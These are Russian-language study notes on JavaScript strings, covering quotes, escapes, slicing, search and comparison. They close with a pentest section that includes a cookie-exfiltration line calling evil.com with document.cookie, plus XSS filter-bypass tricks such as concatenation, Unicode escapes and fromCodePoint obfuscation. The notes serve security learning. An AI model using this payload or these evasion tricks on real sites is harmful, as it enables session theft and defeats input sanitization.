
# JS: Строки

## 📌 Что это

Любые **текстовые данные** — это строки. Отдельного типа «символ» в JS нет.

**Внутренний формат:** UTF-16, вне зависимости от кодировки страницы.

---

## 💬 Три вида кавычек

```js
let single    = 'одинарные';
let double    = "двойные";
let backticks = `обратные`;
```

**Одинарные и двойные** — работают одинаково.

**Обратные** — умеют **две вещи**, которых не умеют другие:

### 1. Подстановка выражений через `${...}`

```js
function sum(a, b) { return a + b; }

console.log(`1 + 2 = ${sum(1, 2)}.`);   // "1 + 2 = 3."
```

⚠️ В `"..."` и `'...'` подстановка **не работает**:
```js
console.log("1 + 2 = ${sum(1, 2)}");    // буквально "${sum(1, 2)}"
```

### 2. Многострочность

```js
let list = `Гости:
 * John
 * Pete
 * Mary
`;
```

⚠️ В `"..."` многострочность **нельзя** — ошибка.

## 🔣 Спецсимволы

Все начинаются с **обратного слеша `\`** — это **символ экранирования**.

| Символ | Что означает |
|--------|--------------|
| `\n` | Перевод строки |
| `\r` | Возврат каретки (в Windows `\r\n`) |
| `\'` | Одинарная кавычка |
| `\"` | Двойная кавычка |
| `` \` `` | Обратная кавычка |
| `\\` | Обратный слеш |
| `\t` | Табуляция |

**Примеры:**

```js
console.log("Hello\nWorld");       // две строки
console.log("I'm the Walrus!");    // ← ошибка? нет, обычная строка
console.log('I\'m the Walrus!');   // экранировали одинарную
console.log(`I'm the Walrus!`);    // обратные кавычки — не нужно экранировать
console.log(`Backslash: \\`);      // один \
```

⚠️ `\n` в памяти — **один символ**, а не два.

## 📏 Длина строки: `.length`

```js
console.log(`My\n`.length);        // 3  (M, y, \n)
console.log("Hello".length);       // 5
```

⚠️ **Без скобок!** `.length` — это **свойство**, не метод.
```js
"Hello".length        // ✅ 5
"Hello".length()      // ❌ ошибка
```

## 🔍 Доступ к символам

```js
let str = "Hello";

console.log(str[0]);            // "H"
console.log(str.at(0));         // "H"
console.log(str[str.length-1]); // "o"
console.log(str.at(-1));        // "o"  ← отрицательный индекс — от конца
```

**Разница:**
- `str[pos]` — отрицательные **не работают**, вернёт `undefined`.
- `str.at(pos)` — **работает** с отрицательными.

**Перебор по символам:**
```js
for (let char of "Hello") {
    console.log(char);   // H, e, l, l, o
}
```

---

## 🔒 Строки неизменяемы

**Нельзя** заменить символ посередине:

```js
let str = "Hi";
str[0] = "h";           // ❌ не работает
console.log(str);       // "Hi"
```

**Можно** — создать **новую** строку:

```js
str = "h" + str[1];     // ✅
console.log(str);       // "hi"
```

## 🔤 Регистр

```js
"Interface".toUpperCase();   // "INTERFACE"
"Interface".toLowerCase();   // "interface"
"Interface"[0].toLowerCase(); // "i"
```

## 🔎 Поиск подстроки

### `str.indexOf(substr, pos)` — позиция или `-1`

```js
let str = "Widget with id";

str.indexOf("Widget");       // 0
str.indexOf("widget");       // -1  ← регистр важен!
str.indexOf("id");           // 1
str.indexOf("id", 2);        // 12  ← искать с позиции 2
```

⚠️ **Ловушка:** `if (str.indexOf("..."))` — **не сработает**, если найдено на позиции 0.

**Правильно:**
```js
if (str.indexOf("Widget") != -1) { ... }
```

### `str.lastIndexOf(substr, pos)` — поиск с конца

### `str.includes(substr, pos)` — `true`/`false` (современный)

```js
"Widget with id".includes("Widget");   // true
"Hello".includes("Bye");               // false
"Midget".includes("id", 3);            // false — поиск с позиции 3
```

### `str.startsWith(...)` / `str.endsWith(...)`

```js
"Widget".startsWith("Wid");   // true
"Widget".endsWith("get");     // true
```

### Трюк с `~` (старый код)

```js
if (~str.indexOf("...")) { ... }   // = "если найдено"
```

⚠️ В новом коде — используй `.includes()`.

## ✂️ Получение подстроки

### `slice(start, end)` — **рекомендую**

```js
let str = "stringify";

str.slice(0, 5);      // "strin"  (0..4, не включая 5)
str.slice(2);         // "ringify" (с 2 до конца)
str.slice(-4, -1);    // "gif"     (с конца)
```

**Плюсы:** поддерживает отрицательные индексы, короткий.

### `substring(start, end)` — почти то же

```js
str.substring(2, 6);   // "ring"
str.substring(6, 2);   // "ring"  ← меняет аргументы местами!
```

⚠️ Отрицательные → **превращаются в 0**.

### `substr(start, length)` — устаревший

```js
str.substr(2, 4);      // "ring" — 4 символа с позиции 2
str.substr(-4, 2);     // "gi"
```

⚠️ В Annex B, но работает везде. **Избегай в новом коде.**

### 📊 Сравнение

| Метод | Что выбирает | Отрицательные |
|-------|--------------|---------------|
| `slice(start, end)` | от start до end (не включая) | ✅ Работают |
| `substring(start, end)` | между start и end | → 0 |
| `substr(start, length)` | length символов с start | ✅ Для start |

**Правило:** используй **`slice`** в 90% случаев.

## 🔀 Сравнение строк

**Строки сравниваются посимвольно по кодам UTF-16.**

```js
'a' > 'Z'               // true  (код a=97 > Z=90)
'Österreich' > 'Zealand' // true (Ö вне основного алфавита)
```

### `str.codePointAt(pos)` — код символа

```js
"z".codePointAt(0);     // 122
"Z".codePointAt(0);     // 90
```

### `String.fromCodePoint(code)` — символ по коду

```js
String.fromCodePoint(90);   // "Z"
```

### `str.localeCompare(str2)` — правильное сравнение

```js
'Österreich'.localeCompare('Zealand');   // -1 (Ö < Z по-немецки)
```

Возвращает:
- Отрицательное — `str < str2`.
- Положительное — `str > str2`.
- `0` — равны.

| Метод | Что делает |
|-------|-----------|
| `.length` | Длина строки |
| `.toUpperCase()` | В верхний регистр |
| `.toLowerCase()` | В нижний регистр |
| `.trim()` | Убирает пробелы по краям |
| `.repeat(n)` | Повторяет строку `n` раз |

| `.startsWith(s)` | Начинается ли с |

## 🎯 Связь с пентестом

- **Все XSS-payload'ы — строки.** `<script>alert(1)</script>` — это строка.
- **Шаблонные строки** — для подстановки данных:
  ```js
  fetch(`https://evil.com/?c=${document.cookie}`)
  ```
  ⚠️ В `"..."` и `'...'` подстановка **не работает** — важно знать.
- **`.length`** — длина payload'а. Некоторые фильтры ограничивают длину.
- **Экранирование** — основа обхода фильтров:
  - `\'` — если фильтр блокирует `'`, можно попробовать `\x27`.
  - `\u0041` — Unicode-escape для `A`.
- **`.replace()`** — используется в санитизации. Понимание нужно для **обхода**:
  ```js
  "script".replace(/script/g, "")   // что останется от "<script>"?
  ```
- **`.split()` и `.join()`** — обход чёрных списков:
  ```js
  "scr" + "ipt"   // конкатенация = "script"
  ```
- **`String.fromCodePoint(...)`** — обфускация payload'ов:
  ```js
  String.fromCodePoint(97, 108, 101, 114, 116, 40, 49, 41)   // "alert(1)"
  ```
  Фильтр видит **числа**, а не `alert`.
- **`.at(-1)`** — используется для отсечения последнего символа.
- **Регистр** — некоторые фильтры не учитывают `ToUpperCase()`:
  ```js
  "<sCrIpT>".toLowerCase()   // "<script>"
  ```
